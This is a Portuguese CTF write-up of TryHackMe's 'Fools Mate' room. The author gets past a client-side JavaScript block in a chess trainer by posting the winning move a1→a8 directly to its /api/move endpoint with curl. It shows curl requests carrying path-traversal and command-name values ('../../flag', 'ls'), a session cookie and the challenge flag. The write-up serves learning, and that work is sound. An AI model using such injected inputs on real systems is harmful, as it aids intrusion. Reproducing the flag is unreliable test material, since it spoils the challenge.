# ♜ Fools Mate — CTF Writeup
### TryHackMe | Web Exploitation | Bypass de Validação Client-Side · API Abuse · Burp Suite

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 12/08/2026                                                                             |
| **Data do Pentest**   | 12/08/2026 · 23:55 – 23:56 (GMT+0000)                                                  |
| **Alvo**              | `10.64.191.234` (aplicação **EndgameTrainer**)  — TryHackMe · Fools Mate               |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Google Chrome DevTools · Burp Suite Community Edition · cURL                          |
| **Plataforma**        | TryHackMe — Web Exploitation                                                           |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo do desafio **Fools Mate** (TryHackMe), uma aplicação web chamada **EndgameTrainer** — um treinador de finais de xadrez (backend Node.js/Express) que apresenta ao usuário uma posição de **"mate em um lance" (Mate-in-one)** para ser resolvida. A cadeia de ataque envolveu: interação inicial com a interface do tabuleiro, onde uma tentativa de jogar o lance vencedor no navegador foi bloqueada por um mecanismo de **"anti-cheat" client-side** (um alerta JavaScript ameaçando "desligar o PC" e o bloqueio da requisição antes mesmo de ser enviada); inspeção do tráfego de rede via **DevTools**, revelando múltiplas chamadas `move` falhas; interceptação da comunicação real com o backend via **Burp Suite**, expondo o endpoint **`POST /api/move`** e seu esquema JSON (`{"from":"...", "to":"..."}`), junto ao cookie de sessão (`sid`); testes de validação e tentativas de injeção/path traversal diretamente contra a API via **cURL**, confirmando que o backend rejeita corretamente entradas maliciosas; e, finalmente, o **envio do lance de xadrez vencedor diretamente à API**, contornando por completo a lógica de bloqueio do lado do cliente, resultando em um `checkmate` reconhecido pelo servidor e na liberação da flag do desafio.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                     | Versão  | Finalidade                                                                             |
|---------------------------------|---------|-----------------------------------------------------------------------------------------|
| **Google Chrome DevTools**      | -       | Inspeção da aba Network — identificação das chamadas `move` bloqueadas/falhas           |
| **Burp Suite Community Edition**| 2026.7.2 | Interceptação e análise da requisição real enviada ao endpoint `/api/move`             |
| **cURL**                        | -       | Envio de requisições diretas e manipuladas ao backend, contornando o cliente web        |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento da Aplicação: EndgameTrainer

Ao acessar `http://10.64.191.234/`, a aplicação **EndgameTrainer** apresenta um tabuleiro de xadrez interativo com o desafio:

```
Mate-in-one · White to move
```

A posição exibida corresponde a um clássico **mate no corredor (back-rank mate)**: peças brancas com uma torre na coluna `a` e rei protegido por peões, contra um rei preto preso atrás de seus próprios peões nas colunas `f`, `g` e `h` — sem casas de fuga disponíveis. O lance vencedor evidente é mover a torre até a oitava fileira (`a1–a8`), entregando xeque-mate.

---

### FASE 2 — Bloqueio Client-Side: o "Anti-Cheat" JavaScript

Ao tentar jogar o lance vencedor diretamente pela interface do tabuleiro, a aplicação exibiu um alerta inesperado:

```
/usr/lib32

⛔ I'll shut down your PC if you play that.

[ OK ]
```

Simultaneamente, a aba **Network** do DevTools revelou múltiplas requisições `move` marcadas com falha (ícones vermelhos), seguidas de uma chamada `reset`:

```
move   (failed)
move   (failed)
move   (failed)
reset
7 requests | 2.3 kB transferred
```

![Checkmate Faliure](/CTFs/Fools%20Mate/images/Error_to_Checkmate.png)

Esse comportamento indicou que a aplicação possui uma **camada de validação/bloqueio inteiramente do lado do cliente** (JavaScript), que intercepta e impede o envio de determinados lances — incluindo, propositalmente, o lance de xeque-mate correto — antes que a requisição chegue ao servidor. Esse é o núcleo da vulnerabilidade: **confiar em lógica de negócio crítica executada no navegador**, algo que qualquer usuário pode inspecionar e contornar.

---

### FASE 3 — Interceptação de Tráfego: Descoberta da API Real

Para confirmar a hipótese, o tráfego da aplicação foi interceptado com o **Burp Suite**, revelando a requisição real feita ao backend quando um lance válido (não bloqueado) era jogado:

```http
POST /api/move HTTP/1.1
Host: 10.64.191.234
Content-Type: application/json
Cookie: sid=b42893a5461cf3edd38e2785235a6cbb

{
  "from": "f2",
  "to": "f4"
}
```

A interceptação confirmou dois pontos essenciais:

1. O endpoint **`POST /api/move`** é o único responsável por validar e aplicar lances no estado real do jogo, mantido no **servidor**.
2. A sessão do jogo é identificada por um **cookie `sid`**, permitindo reproduzir requisições fora do navegador, com curl ou qualquer outro cliente HTTP.

![Burp Suite](/CTFs/Fools%20Mate/images/Take_Request.png)
> 🚨 **Vulnerabilidade confirmada: validação de regras de negócio (lances válidos/vencedores) delegada ao JavaScript do cliente, sem reforço equivalente e completo no servidor para bloquear lances específicos "banidos" pela interface.**

---

### FASE 4 — Testes Diretos contra a API: Validação e Tentativas de Injeção

Com o endpoint e o cookie de sessão em mãos, uma série de requisições foi enviada diretamente via `curl`, testando tanto a robustez da validação quanto possíveis vetores de injeção/path traversal no campo `from`:

```bash
curl -i 'http://10.64.191.234/api/move' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sid=b42893a5461cf3edd38e2785235a6cbb' \
  --data '{"from":"../../flag","to":"f4"}'
```

```
HTTP/1.1 400 Bad Request
{"ok":false,"error":"illegal move","fen":"6k1/5ppp/8/8/5P2/8/6PP/R5K1 w - - 1 3"}
```

Tentativas adicionais com `"flag"`, `"ls"` e `"f3"` (combinado com `"../../flag"` como destino) no lugar de coordenadas válidas do tabuleiro também foram testadas:

```bash
curl -i 'http://10.64.191.234/api/move' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sid=b42893a5461cf3edd38e2785235a6cbb' \
  --data '{"from":"flag","to":"f4"}'
# → 400 Bad Request — {"ok":false,"error":"illegal move", ...}

curl -i 'http://10.64.191.234/api/move' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sid=b42893a5461cf3edd38e2785235a6cbb' \
  --data '{"from":"ls","to":"f4"}'
# → 400 Bad Request — {"ok":false,"error":"illegal move", ...}

curl -i 'http://10.64.191.234/api/move' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sid=b42893a5461cf3edd38e2785235a6cbb' \
  --data '{"from":"f3","to":"../../flag"}'
# → 400 Bad Request — {"ok":false,"error":"illegal move", ...}
```

Todas as tentativas de manipular o campo `from`/`to` com valores fora da notação de xadrez (`path traversal`, nomes de comando, coordenadas inválidas) foram **corretamente rejeitadas pelo servidor** com `400 Bad Request` e a mensagem `"illegal move"`, confirmando que a **validação sintática e das regras do xadrez no backend é robusta** — a falha de segurança não estava em injeção, mas sim no **bloqueio seletivo e apenas client-side de lances legítimos específicos**.

---

### FASE 5 — Exploração: Envio Direto do Lance Vencedor

Com a certeza de que o backend validava corretamente as regras do xadrez (e não continha um bloqueio equivalente ao do cliente para o lance de mate), o lance vencedor identificado na Fase 1 — mover a torre de `a1` para `a8` — foi enviado **diretamente à API**, contornando por completo a interface web e seu alerta de "anti-cheat":

```bash
curl -i 'http://10.64.191.234/api/move' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sid=b42893a5461cf3edd38e2785235a6cbb' \
  --data '{"from":"a1","to":"a8"}'
```

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{
  "ok": true,
  "move": "a1a8",
  "fen": "R5K1/5ppp/8/8/5P2/8/6PP/6K1 b - - 2 3",
  "status": "checkmate",
  "turn": "b",
  "winner": "white",
  "flag": "THM{cl13nt_s1d3_ch3ckm4t3}"
}
```

O servidor confirmou o lance `a1a8` como válido, atualizou o estado do jogo (`fen`), reconheceu a condição de **`checkmate`**, declarou o vencedor (`white`) e retornou a flag do desafio diretamente no corpo da resposta JSON.

![Flag](/CTFs/Fools%20Mate/images/Win_a_Game.png)
> 🚩 **FLAG CAPTURADA: `THM{cl13nt_s1d3_ch3ckm4t3}`**

O próprio conteúdo da flag confirma a natureza da vulnerabilidade explorada: um **"client-side checkmate"** — o xeque-mate real do desafio não foi vencido no tabuleiro visual, mas sim contra a falsa premissa de que a validação do lado do cliente seria suficiente para impedir determinadas jogadas.

---

## ⛓ Linha do Tempo do Comprometimento

```
[FASE 1] RECONHECIMENTO DA APLICAÇÃO
    EndgameTrainer — desafio "Mate-in-one · White to move"
    Lance vencedor identificado: Ra1-a8
    ↓
[FASE 2] BLOQUEIO CLIENT-SIDE
    Alerta JS: "I'll shut down your PC if you play that."
    Requisições 'move' falhando na aba Network (DevTools)
    ↓
[FASE 3] INTERCEPTAÇÃO DE TRÁFEGO (Burp Suite)
    Endpoint real descoberto: POST /api/move
    Schema JSON: {"from": "...", "to": "..."} + cookie sid
    ↓
[23:55 GMT] FASE 4 — TESTES DIRETOS NA API (cURL)
    Tentativas de path traversal/injeção em 'from' → 400 "illegal move"
    Validação de regras de xadrez confirmada como robusta no backend
    ↓
[23:56 GMT] FASE 5 — EXPLORAÇÃO
    curl direto: {"from":"a1","to":"a8"} → 200 OK
    status: checkmate | winner: white
    FLAG: THM{cl13nt_s1d3_ch3ckm4t3} ✓
    ↓
DESAFIO CONCLUÍDO — bypass completo da validação client-side
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Navegação manual | Desafio de xadrez "Mate-in-one" — lance vencedor: `Ra1-a8` |
| Identificação do Bloqueio | DevTools (aba Network) | Lance vencedor bloqueado por lógica JavaScript client-side |
| Interceptação | Burp Suite (Proxy) | Endpoint real `POST /api/move`, schema JSON e cookie `sid` |
| Teste de Robustez | cURL (path traversal/injeção) | Backend rejeita corretamente entradas inválidas (`400 illegal move`) |
| Exploração | cURL (requisição direta) | Lance `a1a8` aceito pelo servidor — `checkmate` confirmado |
| Resultado | Resposta JSON da API | Flag retornada diretamente: `THM{cl13nt_s1d3_ch3ckm4t3}` |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.64.191.234` | Aplicação web EndgameTrainer (TryHackMe — Fools Mate) |
| Stack identificada | Node.js / Express | Header `X-Powered-By: Express` presente em todas as respostas da API |
| Endpoint vulnerável | `POST /api/move` | Único ponto de validação real das regras do jogo |
| Cookie de sessão | `sid=b42893a5461cf3edd38e2785235a6cbb` | Identifica o estado da partida no servidor |
| Mecanismo de bloqueio ineficaz | Alerta JavaScript "anti-cheat" | Bloqueia lances apenas na camada de apresentação (cliente) |
| Payloads de teste rejeitados | `../../flag`, `flag`, `ls` (no campo `from`) | Confirmaram ausência de vulnerabilidade de injeção/path traversal |
| Lance vencedor explorado | `{"from":"a1","to":"a8"}` | Aceito diretamente pela API, resultando em xeque-mate |
| Flag | `THM{cl13nt_s1d3_ch3ckm4t3}` | Retornada no corpo da resposta JSON de `/api/move` |
| Técnica (OWASP) | Broken Access Control / Business Logic Bypass | Confiança indevida em validação client-side para regras críticas |
| Técnica (MITRE ATT&CK) | `T1190` (adaptado a apps web) | Exploração de falha de lógica de aplicação exposta publicamente |

---

## ✅ Resumo da Flag

| # | Flag | Valor | Origem |
|---|------|-------|--------|
| 🚩 Flag | Resposta JSON de `/api/move` | `THM{cl13nt_s1d3_ch3ckm4t3}` | Requisição `POST /api/move` com `{"from":"a1","to":"a8"}` |

---

## 📚 Referências

- [TryHackMe — Fools Mate](https://tryhackme.com/room/foolsmate)
- [OWASP — Business Logic Vulnerability](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)
- [OWASP Testing Guide — Client-Side Testing](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger — Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

---